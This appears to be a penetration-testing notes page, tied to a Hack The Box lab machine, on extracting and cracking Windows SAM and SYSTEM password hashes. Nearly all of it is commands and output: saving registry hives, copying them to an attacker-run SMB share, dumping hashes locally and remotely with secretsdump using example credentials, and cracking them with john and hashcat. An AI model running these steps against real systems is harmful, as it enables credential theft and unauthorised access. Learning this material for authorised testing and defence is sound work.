# SAM and SYSTEM Files

[Cicada HTB](https://app.hackthebox.com/machines/Cicada)

The Security Account Manager (SAM) is a database file in Windows that stores user credentials, including NTLM and sometimes LM hashes of user passwords. These hashes are stored in a protected registry hive and are used to authenticate users on the system.

## SAM Operation Modes:

- Online Mode – Requires SYSTEM user or token to access.  

- Offline Mode – Requires SYSTEM and SAM registry hives or backup files.  

## Location of SAM File:

- The SAM file is stored in the following location:  

```text
%SystemRoot%\System32\config\SAM
````

- It is mounted on `HKLM\SAM`.

## Common Locations of SAM and SYSTEM Files

- Typical file paths for SAM and SYSTEM files:

```text
%SYSTEMROOT%\repair\SAM  
%SYSTEMROOT%\System32\config\RegBack\SAM  
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\repair\system  
%SYSTEMROOT%\System32\config\SYSTEM  
%SYSTEMROOT%\System32\config\RegBack\system  
```

> Note: `%SYSTEMROOT%` is usually `C:\Windows`

## Generating Hash Files from SAM and SYSTEM

> To extract password hashes from the SAM and SYSTEM files, you can use tools like `pwdump` or `samdump2`.

- Generate a hash file using `pwdump`:

```bash
pwdump SYSTEM SAM > /root/sam.txt
```

- Generate a hash file using `samdump2`:

```bash
samdump2 SYSTEM SAM -o sam.txt
```

## Cracking the Hash with `John the Ripper`

- Use `john` to crack the NTLM hash:

```bash
john -format=NT /root/sam.txt
```


## Extracting Windows Password Hashes

### Step 1: Save SAM, SYSTEM, and SECURITY Hives

- Use the `reg save` command to export the registry hives:

```cmd
mkdir c:\samdump
```

```cmd
reg save hklm\sam c:\samdump\sam  
```

```cmd
reg save hklm\system c:\samdump\system  
```

```cmd
reg save hklm\security c:\samdump\security  
```

### Step 2: Transfer Files to Attacker Machine

- Start an SMB server using Impacket:

```bash
impacket-smbserver -smb2support -user user -password 12345 share /opt/share
```

- Copy the files over the network:

```cmd
copy sam \\192.168.1.7\share\
```

```cmd
copy system \\192.168.1.7\share\  
```

### Step 3: Clone and Install Impacket

- Clone the Impacket repository and install it:

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

```bash
cd impacket
```

```bash
pip install .
```

### Step 4: Extract Password Hashes with `secretsdump`

- Use `impacket-secretsdump` to extract the NTLM hashes:

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL
```

> Sample Output:

```text
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x9dbb07b7aa3fe060815fd1612fd7ce89
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
win7:1000:aad3b435b51404eeaad3b435b51404ee:e41b0d190802c1fcfd3d8dff20d97090:::
user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
[*] Cleaning up...
```

### Step 5: Save the NTLM Hash to a File

- Open the NTLM hash file using `vim` or any text editor:

```bash
vim ntml.txt
```

> Example NTLM hash:

```bash
e41b0d190802c1fcfd3d8dff20d97090
```

### Step 6: Crack NTLM Hash with `hashcat`

- Use `hashcat` to crack the NTLM hash:

```bash
hashcat -m 1000 -a 0 ntml.txt /usr/share/wordlists/rockyou.txt -o ntml.out.txt
```

## Dumping Remote Hashes Using secretsdump

- You can also dump hashes from a remote target:

```bash
impacket-secretsdump ns1/administrator:@rmour123@192.168.1.41
```

```bash
impacket-secretsdump DESKTOP-SQPBP0N/administrator:@rmour123@192.168.1.41
```

- Example using a specific user account:

```bash
impacket-secretsdump administrator:@rmour123@192.168.1.41
```


## Extracting Bootkey from SYSTEM Hive

### Using `bkhive`

- Use `bkhive` to extract the bootkey from a Windows SYSTEM hive:

```bash
bkhive system bootkey.txt
```

## Cracking Windows Password Hashes

### Supported Tools:

- `john` – Cracks NTLM/LM hashes.

- `hashcat` – Fast GPU-based hash cracker.

- `Cain & Abel` – GUI-based tool for Windows hash extraction.

- `samdump2` – Extracts password hashes from the SAM file.

- `bkhive` – Extracts syskey bootkey from SYSTEM hive.


## Troubleshooting

### Hashes Not Extracting Properly

- Ensure you have the correct SYSTEM and SAM files.

- Confirm the files are not corrupted.

- Double-check file permissions and user access.

### Hashcat Cracking Fails

- Try a different wordlist.

- Ensure `hashcat` is using the correct attack mode (`-m 1000` for NTLM).

- Update your GPU drivers for better performance.


## Conclusion

- Extracting and cracking password hashes from the SAM file is a crucial part of penetration testing and security research. Tools like `impacket-secretsdump`, `hashcat`, and `john` are essential for working with Windows authentication data.

## Related
- [Password Mining](Password-Mining.md) — parent hub
- [Mounting VHD and VHDX](Mounting-VHD-and-VHDX.md) — recovering hives from images/backups
- [NTDS.DIT Active Directory Domain](NTDS.DIT-Active-Directory-Domain.md) — domain equivalent of SAM dumping
- Mimikatz Usage and Execution — extracting hashes from hives
- Password Cracking — crack the recovered NTLM hashes
